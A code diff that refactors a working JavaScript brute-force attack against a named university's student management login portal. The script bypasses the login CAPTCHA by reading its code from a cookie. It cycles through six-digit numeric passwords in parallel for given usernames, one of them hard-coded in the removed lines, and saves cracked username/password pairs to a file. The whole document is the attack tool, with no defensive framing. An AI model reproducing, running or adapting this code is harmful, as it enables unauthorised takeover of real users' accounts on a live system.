@@ -34,94 +34,131 @@ var __generator = (this && this.__generator) || function (thisArg, body) {
         if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
     }
 };
-var _this = this;
 exports.__esModule = true;
+var FormData = require("form-data");
 var node_fetch_1 = require("node-fetch");
-var form_data_1 = require("form-data");
-var cheerio_1 = require("cheerio");
+var cheerio = require("cheerio");
+var fs_1 = require("fs");
+var os_1 = require("os");
 var log = console.log;
 var baseUrl = "http://mis.sse.ustc.edu.cn/";
 var pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g;
-var cookieJar = [];
-var view_state = "";
-var username = "sa18225541";
-var password = "000000";
-var app = function () {
-    node_fetch_1["default"](baseUrl)
-        .then(function (result) { return __awaiter(_this, void 0, void 0, function () {
-        var sessionId, body, $, imgUrl, url, r, str, validateCode, sum, formData, login, iflysse, len, i;
-        return __generator(this, function (_a) {
-            switch (_a.label) {
-                case 0:
-                    sessionId = (result.headers.get("set-cookie") || "").split(";")[0];
-                    cookieJar.push(sessionId);
-                    return [4 /*yield*/, result.text()];
-                case 1:
-                    body = _a.sent();
-                    $ = cheerio_1["default"].load(body);
-                    view_state = $("#__VIEWSTATE").val();
-                    log("before" + Date.now());
-                    imgUrl = body.match(pattern) || [""];
-                    url = baseUrl + imgUrl[0].replace("&amp;", "&");
-                    log("after" + Date.now());
-                    return [4 /*yield*/, node_fetch_1["default"](url, {
-                            headers: {
-                                "cookie": cookieJar.join(";")
+function worker(username) {
+    return new Promise(function (resolve, reject) {
+        var times = 5; // retry times
+        var success = false;
+        var view_state = "";
+        var password = "000000";
+        function app() {
+            return __awaiter(this, void 0, void 0, function () {
+                var mypass, result, cookieJar, sessionId, body, $, imgUrl, url, r, str, validateCode, sum_1, formData, login, iflysse, err_1;
+                return __generator(this, function (_a) {
+                    switch (_a.label) {
+                        case 0:
+                            mypass = password;
+                            _a.label = 1;
+                        case 1:
+                            _a.trys.push([1, 6, , 7]);
+                            return [4 /*yield*/, node_fetch_1["default"](baseUrl)];
+                        case 2:
+                            result = _a.sent();
+                            if (parseInt(password) > 999999) {
+                                resolve(false);
+                                return [2 /*return*/];
                             }
-                        })];
-                case 2:
-                    r = _a.sent();
-                    str = r.headers.get("set-cookie") || "";
-                    cookieJar.push(str.split(";")[0]);
-                    validateCode = (str.match(/[0-9]{4}/) || [""])[0];
-                    log("validate code:", validateCode);
-                    sum = 0;
-                    validateCode.split("").forEach(function (val) {
-                        sum += parseInt(val);
-                    });
-                    log("sum:", sum);
-                    log("session", cookieJar);
-                    formData = new form_data_1["default"]();
-                    formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
-                    formData.append("__VIEWSTATE", view_state);
-                    formData.append("winLogin$sfLogin$txtUserLoginID", username);
-                    formData.append('winLogin$sfLogin$txtPassword', password);
-                    formData.append('winLogin$sfLogin$txtValidate', sum);
-                    return [4 /*yield*/, node_fetch_1["default"](baseUrl + "default.aspx", {
-                            method: "post",
-                            headers: {
-                                cookie: cookieJar.join(";")
-                            },
-                            body: formData
-                        })];
-                case 3:
-                    login = _a.sent();
-                    iflysse = (login.headers.get("set-cookie") || "").split(";")[0];
-                    if (iflysse.length === 0) {
-                        log("failed ", "password: ", password);
-                        password = "" + (parseInt(password) + 1);
-                        if (password.length < 6) {
-                            log("len", password.length);
-                            len = password.length;
-                            for (i = 0; i < 6 - len; i++) {
-                                password = 0 + password;
+                            if (success) {
+                                return [2 /*return*/];
                             }
-                        }
-                        cookieJar.length = 0;
-                        app();
+                            cookieJar = [];
+                            sessionId = (result.headers.get("set-cookie") || "").split(";")[0];
+                            cookieJar.push(sessionId);
+                            return [4 /*yield*/, result.text()];
+                        case 3:
+                            body = _a.sent();
+                            $ = cheerio.load(body);
+                            view_state = $("#__VIEWSTATE").val();
+                            imgUrl = body.match(pattern) || [""];
+                            url = baseUrl + imgUrl[0].replace("&amp;", "&");
+                            return [4 /*yield*/, node_fetch_1["default"](url, {
+                                    headers: {
+                                        "cookie": cookieJar.join(";")
+                                    }
+                                })];
+                        case 4:
+                            r = _a.sent();
+                            str = r.headers.get("set-cookie") || "";
+                            cookieJar.push(str.split(";")[0]);
+                            validateCode = (str.match(/[0-9]{4}/) || [""])[0];
+                            log("validate code:", validateCode);
+                            sum_1 = 0;
+                            validateCode.split("").forEach(function (val) {
+                                sum_1 += parseInt(val);
+                            });
+                            log("sum:", sum_1);
+                            log("session", cookieJar);
+                            formData = new FormData();
+                            formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
+                            formData.append("__VIEWSTATE", view_state);
+                            formData.append("winLogin$sfLogin$txtUserLoginID", username);
+                            formData.append('winLogin$sfLogin$txtPassword', mypass);
+                            formData.append('winLogin$sfLogin$txtValidate', sum_1 + "");
+                            return [4 /*yield*/, node_fetch_1["default"](baseUrl + "default.aspx", {
+                                    method: "post",
+                                    headers: {
+                                        cookie: cookieJar.join(";")
+                                    },
+                                    body: formData
+                                })];
+                        case 5:
+                            login = _a.sent();
+                            iflysse = (login.headers.get("set-cookie") || "").split(";")[0];
+                            if (iflysse.length === 0) {
+                                log("failed ", "password: ", mypass);
+                                increase();
+                                cookieJar.length = 0;
+                                app();
+                            }
+                            else {
+                                log("success ", "用户名: ", username, "密码: ", mypass);
+                                fs_1["default"].appendFile("result.txt", "success " + "用户名: " + username + "密码: " + os_1["default"].EOL, function (err) {
+                                    console.log(err);
+                                });
+                                success = true;
+                                resolve(true);
+                                return [2 /*return*/];
+                            }
+                            cookieJar.push(iflysse);
+                            return [3 /*break*/, 7];
+                        case 6:
+                            err_1 = _a.sent();
+                            log(err_1);
+                            if (times > 0) {
+                                app(); //retry
+                                times--;
+                            }
+                            else {
+                                reject(err_1);
+                            }
+                            return [3 /*break*/, 7];
+                        case 7: return [2 /*return*/];
                     }
-                    else {
-                        log("success ", "用户名: ", username, "密码: ", password);
-                        return [2 /*return*/];
-                    }
-                    cookieJar.push(iflysse);
-                    log("");
-                    return [2 /*return*/];
+                });
+            });
+        }
+        ;
+        function increase() {
+            password = "" + (parseInt(password) + 1);
+            if (password.length < 6) {
+                var len = password.length;
+                for (var i = 0; i < 6 - len; i++) {
+                    password = 0 + password;
+                }
             }
-        });
-    }); })["catch"](function (err) {
-        log(err);
-        app();
+        }
+        for (var i = 0; i < 50; i++) {
+            increase();
+            app();
+        }
     });
-};
-app();
+}
+exports.worker = worker;
